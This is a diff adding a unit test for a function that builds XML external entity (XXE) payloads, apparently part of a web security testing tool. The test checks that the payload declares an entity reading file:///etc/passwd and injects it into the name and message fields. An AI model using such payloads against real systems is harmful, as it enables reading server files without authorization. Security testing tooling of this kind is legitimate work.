@@ -122,3 +122,14 @@ test("findDeviceObject + graftDevice: carry a known-good device block across bod
   assert.ok(fixed.includes('"os":"android"') && !fixed.includes('"os":"windows"'));
   assert.ok(fixed.includes('"userid":"U"'), "non-device data is preserved");
 });
+
+import { buildXxeXml } from "../src/stateful.js";
+
+test("buildXxeXml: elements named after the app's fields, entity in non-email fields", () => {
+  const xml = buildXxeXml(["data.name", "data.email", "data.message"]);
+  assert.ok(xml.includes("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
+  assert.ok(xml.includes("<name>&xxe;</name>"), "entity injected into name");
+  assert.ok(xml.includes("<message>&xxe;</message>"), "entity injected into message");
+  assert.ok(xml.includes("<email>sahwxxe@example.test</email>"), "email gets a benign value");
+  assert.ok(!xml.includes("<x>"), "no generic placeholder element");
+});
